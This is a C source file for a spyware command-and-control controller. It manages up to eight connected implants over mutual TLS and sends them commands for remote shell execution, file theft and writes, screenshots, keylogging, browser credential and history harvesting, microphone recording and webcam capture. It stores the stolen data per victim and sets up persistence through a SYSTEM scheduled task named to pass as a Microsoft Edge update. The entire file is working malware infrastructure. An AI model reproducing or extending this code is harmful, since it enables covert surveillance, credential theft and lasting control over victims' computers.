#include <stdio.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>

#include "protocol.h"
#include "tls.h"
#include "controller_utils.h"
#include "spyware_controller.h"

#define TLS_CERT_FILE   "certs/controller.crt"
#define TLS_KEY_FILE    "certs/controller.key"
#define TLS_CA_FILE     "certs/ca.crt"
#define TLS_WHITELIST   "certs/whitelist.txt"
#define TLS_CA_KEY_FILE "certs/ca.key"

#define PERSISTENCE_UNKNOWN   -1
#define PERSISTENCE_DISABLED   0
#define PERSISTENCE_ENABLED    1

#define PERSISTENCE_TASK_NAME "MicrosoftEdgeUpdate"
#define PERSISTENCE_CHECK_CMD \
    "schtasks /query /tn \"MicrosoftEdgeUpdate\" >nul 2>&1 && echo TASK_EXISTS || echo TASK_MISSING"
#define PERSISTENCE_CREATE_CMD \
    "schtasks /create /tn \"MicrosoftEdgeUpdate\" " \
    "/tr \"\\\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\\\"\" " \
    "/sc ONLOGON /ru SYSTEM /rl HIGHEST /f"

#define MAX_IMPLANTS 8

typedef struct {
    int   alive;
    int   request_id;
    int   persistence;
    Conn *conn;
    char  remote_ip[INET_ADDRSTRLEN];
    char  os_info[512];
} Session;

static Session         g_sessions[MAX_IMPLANTS];
static pthread_mutex_t g_lock       = PTHREAD_MUTEX_INITIALIZER;
static int             g_token_used = 0;
static int             g_server_fd  = -1;

/* ── Shared helpers ──────────────────────────────────────────────────── */

static int process_response(Packet *response, int request_id, Conn *conn)
{
    (void)conn;
    if (response == NULL) {
        printf("Connection lost.\n\n");
        return -1;
    }
    if (response->request_id != request_id) {
        printf("ERROR: request ID mismatch, expected %d got %d\n",
               request_id, response->request_id);
        free_packet(response);
        return -1;
    }
    print_packet_contents(response);
    free_packet(response);
    return 0;
}

static Packet *run_cmd_raw(const char *cmd, int *request_id, Conn *conn)
{
    (*request_id)++;
    Packet packet = {COMMAND_RUN_CMD, *request_id, (int)strlen(cmd), (char *)cmd};
    send_packet(&packet, conn);
    return recieve_packet(conn);
}

static int detect_persistence(int *request_id, Conn *conn)
{
    Packet *response = run_cmd_raw(PERSISTENCE_CHECK_CMD, request_id, conn);
    if (response == NULL)
        return PERSISTENCE_UNKNOWN;
    int result = PERSISTENCE_UNKNOWN;
    if (response->payload != NULL) {
        if (strstr(response->payload, "TASK_EXISTS"))
            result = PERSISTENCE_ENABLED;
        else if (strstr(response->payload, "TASK_MISSING"))
            result = PERSISTENCE_DISABLED;
    }
    free_packet(response);
    return result;
}

/* ── Session-list display and selection (main thread) ────────────────── */

static void display_sessions(void)
{
    printf("\n+------------------------------------------------------------------+\n");
    printf("| %-64s |\n", "C2 Controller — Connected Implants");
    printf("+------------------------------------------------------------------+\n");
    printf("  %-4s  %-16s  %-28s  %-11s\n",
           "ID", "IP Address", "OS | Hostname", "Persistence");
    printf("  %-4s  %-16s  %-28s  %-11s\n",
           "----", "----------------", "----------------------------", "-----------");

    pthread_mutex_lock(&g_lock);
    int count = 0;
    for (int i = 0; i < MAX_IMPLANTS; i++) {
        if (!g_sessions[i].alive) continue;
        count++;
        const char *pers =
            g_sessions[i].persistence == PERSISTENCE_ENABLED  ? "ENABLED    " :
            g_sessions[i].persistence == PERSISTENCE_DISABLED ? "DISABLED   " :
                                                                "UNKNOWN    ";
        printf("  [%d]  %-16s  %-28.28s  %s\n",
               i + 1,
               g_sessions[i].remote_ip,
               g_sessions[i].os_info,
               pers);
    }
    pthread_mutex_unlock(&g_lock);

    if (count == 0)
        printf("  <No implants connected — waiting for beacon...>\n");

    printf("\n  [0]  Refresh\n");
    printf("  [99] Shutdown All\n");
    printf("Select implant> ");
    fflush(stdout);
}

/* Send COMMAND_SHUTDOWN to every live session, wait for each response,
 * then free the connection and mark the slot dead. */
static void shutdown_all(void)
{
    int count = 0;

    for (int i = 0; i < MAX_IMPLANTS; i++) {
        pthread_mutex_lock(&g_lock);
        int alive = g_sessions[i].alive;
        pthread_mutex_unlock(&g_lock);

        if (!alive) continue;
        count++;

        Session *s = &g_sessions[i];
        s->request_id++;
        Packet pkt = {COMMAND_SHUTDOWN, s->request_id, 0, NULL};
        send_packet(&pkt, s->conn);

        Packet *resp = recieve_packet(s->conn);
        if (resp) {
            printf("  [%d] %.*s\n", i + 1,
                   resp->payload_len, resp->payload ? resp->payload : "");
            free_packet(resp);
        } else {
            printf("  [%d] Connection lost.\n", i + 1);
        }

        pthread_mutex_lock(&g_lock);
        tls_conn_free(s->conn);
        s->conn  = NULL;
        s->alive = 0;
        pthread_mutex_unlock(&g_lock);
    }

    if (count == 0)
        printf("  <No active implants to shut down.>\n");
    else
        printf("\n<All %d implant(s) shut down.>\n", count);
    printf("\n");
    fflush(stdout);
}

static int select_session(void)
{
    while (1) {
        display_sessions();

        char buf[32];
        if (fgets(buf, sizeof(buf), stdin) == NULL)
            continue;
        if (strchr(buf, '\n') == NULL)
            flush_stdin();

        int choice;
        if (sscanf(buf, "%d", &choice) != 1)
            continue;
        if (choice == 0)
            continue; /* refresh */

        if (choice == 99) {
            pthread_mutex_lock(&g_lock);
            int n = 0;
            for (int i = 0; i < MAX_IMPLANTS; i++)
                if (g_sessions[i].alive) n++;
            pthread_mutex_unlock(&g_lock);

            if (n == 0) {
                printf("  <No active implants.>\n\n");
                continue;
            }
            printf("  Shut down all %d implant(s)? [y/N] ", n);
            fflush(stdout);
            char confirm[8];
            if (fgets(confirm, sizeof(confirm), stdin) == NULL) continue;
            if (strchr(confirm, '\n') == NULL) flush_stdin();
            if (confirm[0] != 'y' && confirm[0] != 'Y') {
                printf("  <Cancelled.>\n\n");
                continue;
            }
            shutdown_all();
            continue;
        }

        int slot = choice - 1;
        if (slot < 0 || slot >= MAX_IMPLANTS) {
            printf("  <Invalid choice.>\n");
            continue;
        }

        pthread_mutex_lock(&g_lock);
        int alive = g_sessions[slot].alive;
        pthread_mutex_unlock(&g_lock);

        if (!alive) {
            printf("  <Session %d is not connected.>\n", choice);
            continue;
        }
        return slot;
    }
}

/* ── Per-session command prompt ──────────────────────────────────────── */

static void display_prompt(int persistence)
{
    const char *status =
        persistence == PERSISTENCE_ENABLED  ? "ENABLED " :
        persistence == PERSISTENCE_DISABLED ? "DISABLED" : "UNKNOWN ";

    printf("+------------------------------------+\n");
    printf("| %-34s |\n", "C2 Controller");
    printf("| Persistence: %-21s |\n", status);
    printf("+------------------------------------+\n");
    printf("Select a command:\n");
    printf("  0 - BACK                       Return to implant list\n");
    printf("  1 - HEARTBEAT                  Check implant is alive\n");
    printf("  2 - SET_SLEEP                  Make implant sleep N seconds\n");
    printf("  3 - SHUTDOWN    (removes implant + task)\n");
    printf("  4 - READ_DATA                  Read a file from the target\n");
    printf("  5 - WRITE_DATA                 Write a file to the target\n");
    printf("  6 - RUN_CMD                    Execute a shell command\n");
    printf("  7 - ENABLE PERSISTENCE         Create scheduled task on target\n");
    printf("  8 - SCREENSHOT                 Capture victim screen\n");
    printf("  9 - CLIPBOARD_GET              Capture clipboard text\n");
    printf(" 10 - KEYLOG_START               Start keylogger\n");
    printf(" 11 - KEYLOG_STOP                Stop keylogger\n");
    printf(" 12 - KEYLOG_DUMP                Dump keylog\n");
    printf(" 13 - CRED_STEAL                 Harvest browser credentials\n");
    printf(" 14 - HISTORY_STEAL              Harvest browser history\n");
    printf(" 15 - MIC_RECORD                 Record microphone audio\n");
    printf(" 16 - CAMERA_SNAPSHOT            Capture webcam photo\n");
    printf("> ");
    fflush(stdout);
}

static int console_input(int persistence)
{
    int choice;
    while (1) {
        char input_buffer[32];
        display_prompt(persistence);
        if (fgets(input_buffer, sizeof(input_buffer), stdin) == NULL) {
            printf("\nInput error. Try again.\n");
            continue;
        }
        if (strchr(input_buffer, '\n') == NULL)
            flush_stdin();
        if (sscanf(input_buffer, "%d", &choice) == 1 &&
            choice >= 0 && choice <= 16)
            break;
        printf("INVALID INPUT! Please enter an integer from 0-16.\n");
    }
    return choice;
}

static char *parameters_input(const char *display_message)
{
    char *input = malloc(256);
    printf("%s", display_message);
    fflush(stdout);
    if (fgets(input, 256, stdin) == NULL) { input[0] = '\0'; return input; }
    if (strchr(input, '\n') == NULL)
        flush_stdin();
    input[strcspn(input, "\n")] = '\0';
    return input;
}

/* ── Command loop for one selected implant (main thread) ─────────────── */

static void run_command_loop(int slot)
{
    Session *s    = &g_sessions[slot];
    Conn    *conn = s->conn;
    int connected = 1;
    int back      = 0;

    /* Build per-implant exfil directory: exfil-data/<hostname>-<ip>
     * os_info format: "Windows 6.2 | DESKTOP-ABC123"
     * Extract everything after " | " as the hostname; fall back to ip only. */
    char save_dir[512];
    const char *pipe_pos = strstr(s->os_info, " | ");
    const char *hostname = pipe_pos ? pipe_pos + 3 : s->remote_ip;
    snprintf(save_dir, sizeof(save_dir), "exfil-data/%s-%s", hostname, s->remote_ip);
    ensure_save_dir(save_dir);

    while (connected) {
        int choice = console_input(s->persistence);

        if (choice == 0) { /* back to session list — keep session alive */
            back = 1;
            break;
        }

        switch (choice) {

        case COMMAND_HEARTBEAT: {
            s->request_id++;
            Packet pkt = {COMMAND_HEARTBEAT, s->request_id, 0, NULL};
            send_packet(&pkt, conn);
            Packet *resp = recieve_packet(conn);
            if (process_response(resp, s->request_id, conn) == -1)
                connected = 0;
            break;
        }

        case COMMAND_READ_DATA: {
            char *path = parameters_input("Enter the path to file to read: ");
            s->request_id++;
            Packet pkt = {COMMAND_READ_DATA, s->request_id,
                          (int)strlen(path), path};
            send_packet(&pkt, conn);
            free(path);
            Packet *resp = recieve_packet(conn);
            if (process_response(resp, s->request_id, conn) == -1)
                connected = 0;
            break;
        }

        case COMMAND_WRITE_DATA: {
            char *path = parameters_input("Enter the path to file to write to: ");
            char *data = parameters_input("Enter the data to write: ");
            int path_len = (int)strlen(path);
            int data_len = (int)strlen(data);
            int total    = 4 + path_len + data_len;
            char *payload = malloc(total);
            memcpy(payload,               &path_len, 4);
            memcpy(payload + 4,           path,      path_len);
            memcpy(payload + 4 + path_len, data,     data_len);
            s->request_id++;
            Packet pkt = {COMMAND_WRITE_DATA, s->request_id, total, payload};
            send_packet(&pkt, conn);
            free(path); free(data); free(payload);
            Packet *resp = recieve_packet(conn);
            if (process_response(resp, s->request_id, conn) == -1)
                connected = 0;
            break;
        }

        case COMMAND_RUN_CMD: {
            char *cmd = parameters_input("Enter command to run: ");
            s->request_id++;
            Packet pkt = {COMMAND_RUN_CMD, s->request_id,
                          (int)strlen(cmd), cmd};
            send_packet(&pkt, conn);
            free(cmd);
            Packet *resp = recieve_packet(conn);
            if (process_response(resp, s->request_id, conn) == -1)
                connected = 0;
            break;
        }

        case COMMAND_SET_SLEEP: {
            char *sx = parameters_input("Enter the time to sleep in seconds: ");
            int n = atoi(sx);
            free(sx);
            char *payload = malloc(4);
            memcpy(payload, &n, 4);
            s->request_id++;
            Packet pkt = {COMMAND_SET_SLEEP, s->request_id, 4, payload};
            send_packet(&pkt, conn);
            free(payload);
            Packet *resp = recieve_packet(conn);
            process_response(resp, s->request_id, conn);
            printf("<Implant sleeping %d s — it will reconnect as a new session.>\n\n", n);
            fflush(stdout);
            /* Drop session now; implant reconnects via acceptor thread */
            connected = 0;
            break;
        }

        case COMMAND_SHUTDOWN: {
            s->request_id++;
            Packet pkt = {COMMAND_SHUTDOWN, s->request_id, 0, NULL};
            send_packet(&pkt, conn);
            Packet *resp = recieve_packet(conn);
            process_response(resp, s->request_id, conn);
            printf("<Implant [%d] shut down.>\n\n", slot + 1);
            fflush(stdout);
            connected = 0;
            break;
        }

        case 7: { /* ENABLE PERSISTENCE */
            if (s->persistence == PERSISTENCE_ENABLED) {
                printf("Persistence is already enabled.\n\n");
                break;
            }
            printf("<Creating scheduled task on implant...>\n\n");
            fflush(stdout);
            Packet *resp = run_cmd_raw(PERSISTENCE_CREATE_CMD,
                                       &s->request_id, conn);
            if (resp == NULL) { connected = 0; break; }
            if (resp->payload && strstr(resp->payload, "SUCCESS")) {
                s->persistence = PERSISTENCE_ENABLED;
                printf("<Persistence ENABLED — task '%s' created.>\n\n",
                       PERSISTENCE_TASK_NAME);
            } else {
                printf("<Failed to create scheduled task.>\n\n");
            }
            free_packet(resp);
            break;
        }

        case 8: { /* SCREENSHOT */
            s->request_id++;
            Packet pkt = {COMMAND_SCREENSHOT, s->request_id, 0, NULL};
            send_packet(&pkt, conn);
            Packet *resp = recieve_packet(conn);
            if (resp && resp->command_type == COMMAND_RESPONSE) {
                handle_screenshot_response(resp, save_dir);
                free_packet(resp);
            } else {
                if (process_response(resp, s->request_id, conn) == -1)
                    connected = 0;
            }
            break;
        }

        case 9: { /* CLIPBOARD_GET */
            s->request_id++;
            Packet pkt = {COMMAND_CLIPBOARD_GET, s->request_id, 0, NULL};
            send_packet(&pkt, conn);
            Packet *resp = recieve_packet(conn);
            if (process_response(resp, s->request_id, conn) == -1)
                connected = 0;
            break;
        }

        case 10: { /* KEYLOG_START */
            s->request_id++;
            Packet pkt = {COMMAND_KEYLOG_START, s->request_id, 0, NULL};
            send_packet(&pkt, conn);
            Packet *resp = recieve_packet(conn);
            if (process_response(resp, s->request_id, conn) == -1)
                connected = 0;
            break;
        }

        case 11: { /* KEYLOG_STOP */
            s->request_id++;
            Packet pkt = {COMMAND_KEYLOG_STOP, s->request_id, 0, NULL};
            send_packet(&pkt, conn);
            Packet *resp = recieve_packet(conn);
            if (process_response(resp, s->request_id, conn) == -1)
                connected = 0;
            break;
        }

        case 12: { /* KEYLOG_DUMP */
            s->request_id++;
            Packet pkt = {COMMAND_KEYLOG_DUMP, s->request_id, 0, NULL};
            send_packet(&pkt, conn);
            Packet *resp = recieve_packet(conn);
            if (resp && resp->command_type == COMMAND_RESPONSE) {
                handle_keylog_dump_response(resp, save_dir);
                free_packet(resp);
            } else {
                if (process_response(resp, s->request_id, conn) == -1)
                    connected = 0;
            }
            break;
        }

        case 13: { /* CRED_STEAL */
            printf("<Harvesting browser credentials (Master Key + Login Data)...>\n\n");
            fflush(stdout);
            s->request_id++;
            Packet pkt = {COMMAND_CRED_STEAL, s->request_id, 0, NULL};
            send_packet(&pkt, conn);
            Packet *resp = recieve_packet(conn);
            if (resp && resp->command_type == COMMAND_RESPONSE) {
                handle_cred_steal_response(resp, save_dir);
                free_packet(resp);
            } else {
                if (process_response(resp, s->request_id, conn) == -1)
                    connected = 0;
            }
            break;
        }

        case 14: { /* HISTORY_STEAL */
            printf("<Harvesting browser history...>\n\n");
            fflush(stdout);
            s->request_id++;
            Packet pkt = {COMMAND_HISTORY_STEAL, s->request_id, 0, NULL};
            send_packet(&pkt, conn);
            Packet *resp = recieve_packet(conn);
            if (resp && resp->command_type == COMMAND_RESPONSE) {
                handle_history_steal_response(resp, save_dir);
                free_packet(resp);
            } else {
                if (process_response(resp, s->request_id, conn) == -1)
                    connected = 0;
            }
            break;
        }

        case 15: { /* MIC_RECORD */
            char *dur_str = parameters_input("Enter recording duration in seconds: ");
            printf("<Recording microphone audio for %s second(s)...>\n\n", dur_str);
            fflush(stdout);
            s->request_id++;
            Packet pkt = {COMMAND_MIC_RECORD, s->request_id,
                          (int)strlen(dur_str), dur_str};
            send_packet(&pkt, conn);
            free(dur_str);
            Packet *resp = recieve_packet(conn);
            if (resp && resp->command_type == COMMAND_RESPONSE) {
                handle_mic_record_response(resp, save_dir);
                free_packet(resp);
            } else {
                if (process_response(resp, s->request_id, conn) == -1)
                    connected = 0;
            }
            break;
        }

        case 16: { /* CAMERA_SNAPSHOT */
            printf("<Capturing webcam snapshot...>\n\n");
            fflush(stdout);
            s->request_id++;
            Packet pkt = {COMMAND_CAMERA_SNAPSHOT, s->request_id, 0, NULL};
            send_packet(&pkt, conn);
            Packet *resp = recieve_packet(conn);
            if (resp && resp->command_type == COMMAND_RESPONSE) {
                handle_camera_snapshot_response(resp, save_dir);
                free_packet(resp);
            } else {
                if (process_response(resp, s->request_id, conn) == -1)
                    connected = 0;
            }
            break;
        }

        default:
            break;
        }
    }

    /* On a real disconnect (SET_SLEEP, SHUTDOWN, lost connection) free the slot.
     * On BACK the session stays alive — do nothing. */
    if (!back) {
        pthread_mutex_lock(&g_lock);
        tls_conn_free(conn);
        s->conn  = NULL;
        s->alive = 0;
        pthread_mutex_unlock(&g_lock);
    }
}

/* ── Acceptor thread: accept → TLS → enroll/HELLO → add session ──────── */

static void *acceptor_thread(void *arg)
{
    (void)arg;

    while (1) {
        struct sockaddr_in ca;
        socklen_t cl = sizeof(ca);
        int raw_fd = accept(g_server_fd, (struct sockaddr *)&ca, &cl);
        if (raw_fd < 0) continue;

        char ip[INET_ADDRSTRLEN];
        strncpy(ip, inet_ntoa(ca.sin_addr), sizeof(ip) - 1);
        ip[sizeof(ip) - 1] = '\0';

        Conn *conn = tls_server_wrap(raw_fd);
        if (conn == NULL) { close(raw_fd); continue; }

        /* ── Enrollment path (no client cert) ──────────────────────── */
        if (!tls_has_client_cert(conn)) {
            Packet *pkt = recieve_packet(conn);
            if (!pkt || pkt->command_type != COMMAND_ENROLL_CSR) {
                if (pkt) free_packet(pkt);
                tls_conn_free(conn);
                continue;
            }

            const char *tok = getenv("ENROLLMENT_TOKEN");
            char *cert_pem  = NULL;
            int   cert_len  = 0;
            int ok = tls_sign_csr(pkt->payload, pkt->payload_len,
                                   TLS_CA_FILE, TLS_CA_KEY_FILE,
                                   tok, TLS_WHITELIST,
                                   &cert_pem, &cert_len);
            free_packet(pkt);

            if (ok) {
                pthread_mutex_lock(&g_lock);
                g_token_used = 1;
                pthread_mutex_unlock(&g_lock);
                Packet resp = {COMMAND_ENROLL_CERT, 0, cert_len, cert_pem};
                send_packet(&resp, conn);
                free(cert_pem);
            }
            tls_conn_free(conn);
            continue;
        }

        /* ── Whitelist check ────────────────────────────────────────── */
        if (!tls_whitelist_check(conn, TLS_WHITELIST)) {
            tls_conn_free(conn);
            continue;
        }

        /* ── HELLO ──────────────────────────────────────────────────── */
        Packet *hello = recieve_packet(conn);
        if (hello == NULL || hello->command_type != COMMAND_HELLO) {
            if (hello) free_packet(hello);
            tls_conn_free(conn);
            continue;
        }

        char os_info[512] = {0};
        if (hello->payload && hello->payload_len > 0) {
            int n = hello->payload_len < 511 ? hello->payload_len : 511;
            memcpy(os_info, hello->payload, n);
        }
        free_packet(hello);

        /* ── Detect persistence ─────────────────────────────────────── */
        int req_id      = 0;
        int persistence = detect_persistence(&req_id, conn);

        /* ── Claim a free session slot ──────────────────────────────── */
        pthread_mutex_lock(&g_lock);
        int slot = -1;
        for (int i = 0; i < MAX_IMPLANTS; i++) {
            if (!g_sessions[i].alive) { slot = i; break; }
        }
        if (slot >= 0) {
            g_sessions[slot].alive       = 1;
            g_sessions[slot].conn        = conn;
            g_sessions[slot].request_id  = req_id;
            g_sessions[slot].persistence = persistence;
            memcpy(g_sessions[slot].remote_ip, ip,      INET_ADDRSTRLEN);
            memcpy(g_sessions[slot].os_info,   os_info, 512);
        }
        pthread_mutex_unlock(&g_lock);

        if (slot < 0)
            tls_conn_free(conn);
    }
    return NULL;
}

/* ── main ─────────────────────────────────────────────────────────────── */

int main(int argc, char *argv[])
{
    (void)argc; (void)argv;

    /* Make stdout unbuffered so docker-attach sees output immediately,
     * regardless of when the operator attaches relative to the exploit firing. */
    setvbuf(stdout, NULL, _IONBF, 0);

    memset(g_sessions, 0, sizeof(g_sessions));

    tls_init_server(TLS_CERT_FILE, TLS_KEY_FILE, TLS_CA_FILE);

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) { perror("socket"); return 1; }

    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    int port = 443;
    const char *env_port = getenv("C2_PORT");
    if (env_port && env_port[0] != '\0') {
        int p = atoi(env_port);
        if (p > 0) port = p;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind"); close(server_fd); return 1;
    }
    if (listen(server_fd, MAX_IMPLANTS) < 0) {
        perror("listen"); close(server_fd); return 1;
    }

    g_server_fd = server_fd;
    printf("<Controller listening on port %d (mTLS) — up to %d concurrent implants>\n\n",
           port, MAX_IMPLANTS);

    pthread_t acc_tid;
    if (pthread_create(&acc_tid, NULL, acceptor_thread, NULL) != 0) {
        perror("pthread_create"); return 1;
    }
    pthread_detach(acc_tid);

    /* Operator UI: pick a session, run commands, back to list, repeat */
    while (1) {
        int slot = select_session();
        run_command_loop(slot);
    }
}
